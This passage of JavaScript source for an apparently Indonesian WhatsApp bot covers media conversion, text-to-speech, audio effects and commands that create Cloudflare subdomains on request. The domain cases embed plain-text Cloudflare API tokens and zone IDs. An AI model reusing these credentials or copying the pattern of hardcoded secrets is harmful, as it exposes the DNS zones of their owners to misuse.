if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await uptotelegra(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'toqr':{
  if (!q) return reply(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await RezzHost.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'tovid': {
                if (!quoted) return reply('Reply Image')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
                reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await RezzHost.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: kalgans })
                await fs.unlinkSync(media)
            }
            break
case 'toptv':
{
if (!isCreator) return reply(mess.owner)
await loading ()
 if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
  if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:kalgans})
RezzHost.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
case 'toimage': case 'toimg': {
if (isBan) return reply2(mess.ban)
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
RezzHost.sendMessage(from, { image: buffer }, {quoted:kalgans})
fs.unlinkSync(ran)
})
}
break
case 'tomp4': case 'tovideo': {
if (isBan) return reply2(mess.ban)
await loading()
if (!quoted) throw `Balas sticker video Dengan Caption ${prefix + command}`
if (/video/.test(mime)) {
let { webp2mp4File } = require('./lib/uploader')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await RezzHost.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, {quoted:kalgans})
await fs.unlinkSync(media)
}
}
break
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
await loading()
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await RezzHost.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
RezzHost.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${RezzHost.user.name}.mp3`}, { quoted : kalgans })
}
break
case 'toaud': case 'audio': {
if (isBan) return reply2(mess.ban)
await loading()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await RezzHost.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
RezzHost.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : kalgans })
}
break
case 'tovn': case 'voice': {
if (isBan) return reply2(mess.ban)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply2(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
RezzHost.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: tumburl,
title: wm,
sourceUrl: gr, 
thumbnailUrl: tumburl,
}
}})
}
break
case 'togif': case 'tovid': case 'tovideo': {
if (isBan) return reply2(mess.ban)
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./lib/uploader')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await RezzHost.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:kalgans})
await fs.unlinkSync(media)
}
break
case 'tourldoc': {
      if (!isCreator) return reply('*Only Owner Aku Bub..*');
      reply('prosesss');
      
      if (!/video/.test(mime) && !/image/.test(mime)) throw `*Kirim/Balas Video/Gambar Dengan Caption* ${prefix + command}`;
      
      if (!quoted) throw `*Kirim/Balas Video/Gambar Dengan Caption* ${prefix + command}`;
      
      let media = await neroxz.downloadAndSaveMediaMessage(quoted);
      
      try {
          let url = await uploadToFileio(media); // Upload ke file.io
          reply(`*File berhasil diupload:*\n${url}`);
          await fs.unlinkSync(media); // Menghapus file setelah upload
      } catch (err) {
          console.log(err);
          reply(`*Gagal upload media:*\n${err.message}`);
      }
  }
  break;
  case 'tourl': {
    if (!isCreator) return reply('*Only Owner Aku Bub..*');
    reply('prosesss');
    
    if (!/video/.test(mime) && !/image/.test(mime)) throw `*Kirim/Balas Video/Gambar Dengan Caption* ${prefix + command}`;
    
    if (!quoted) throw `*Kirim/Balas Video/Gambar Dengan Caption* ${prefix + command}`;
    
    let media = await neroxz.downloadAndSaveMediaMessage(quoted);
    
    try {
        let url = await uploadToImgBB(media); // Upload ke ImgBB
        reply(`*File berhasil diupload:*\n${url}`);
        await fs.unlinkSync(media); // Menghapus file setelah upload
    } catch (err) {
        console.log(err);
        reply(`*Gagal upload media:*\n${err.message}`);
    }
}
break;
case 'tourl2': {
if (!/video/.test(mime) && !/image/.test(mime)) reply(`*Send/reply2 the Video/Image With Caption* ${command}`)
if (!quoted) reply(`*Send/reply the Video/Image Caption* ${command}`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader2')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break


// BATAS CONVERTMENU


// VN MENU


case 'vnindonesia': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=id-ID&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnenglish': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=en-US&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnjepang': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=ja-JP&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnfranch': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=fr-FR&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnphilipines': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=fil-PH&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnmyanmar': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=my&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnjerman': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=de-DE&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnitalia': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=it-IT&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnthailand': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=th-TH&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnindia': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=hi-IN&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break
case 'vnrusia': {
if (!text) return reply(`Example : ${prefix+command} RezzHost`)
reply(mess.wait)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/sound/texttosound?text1=${text}&lang=ru-RU&apikey=${btbApi}`)
RezzHost.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4' }, { quoted: kalgans })
}
break


// BATAS VN MENU


// VOICE MENU


// voicemenu
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                reply(mess.wait)
                let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply2(err)
                let buff = fs.readFileSync(ran)
                RezzHost.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : kalgans })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break  


// VOICE MENU


// DOMAIN MENU
case 'delgc':
if (!isCreator) return reply('Maaf, command ini hanya untuk Owner.')
if (!isGroup) return reply(mess.only.group)
var ini = ntilink.indexOf(m.chat)
ntilink.splice(ini, 1)
fs.writeFileSync('./src/idgrup.json', JSON.stringify(ntilink))
reply('Sukses menghapus akses pada Group ini')
break

case 'addgc':
if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
ntilink.push(m.chat)
fs.writeFileSync('./src/idgrup.json', JSON.stringify(ntilink))
reply('Sukses memberikan akses pada Group Ini')
break

case 'domain1': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
let tld = "panellofficial.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rerez⚡_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain2': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "ea22354b939b4b6ee6d9525130741a95";
let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
let tld = "panellkuofficial.tech";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rerez⚡_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain3': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "5ac16dadc6a80d53657786f70c509a92";
let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
let tld = "panellofficial.site";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rerez⚡_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain4': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "08e177b89345b64ba5334e4d5b4be8e3";
let apitoken = "gX18-NeX9bPvgXBsk8Qz-Foxas5hphjlHIZ5xfzS";
let tld = "xyrezz-official.biz.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain5': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "d28c394ba64bf4ecfec1917829d8bced";
let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB";
let tld = "shopwebsite.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain6': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "95a92e2d61881587d97147504adae179";
let apitoken = "Gh2ZG8DO7MoD7behXJc9NilacIdSv9o1BnMxiY-S";
let tld = "mypanell-store.com";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain7': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "5024bc4a02924cf69ddf4dfa6ee96069";
let apitoken = "OajJ0jtCB0FTFwfdiTB_ktzNKFWAmsENFdlE4Hvd";
let tld = "dewapanel.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain8': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "f22b76756f00ec227c2007ac8ebbeb88";
let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
let tld = "celiaofficial.xyz";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain9': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "a476ffcf9243c44a02220f184da527e8";
let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
let tld = "mypanell.biz.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain10': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
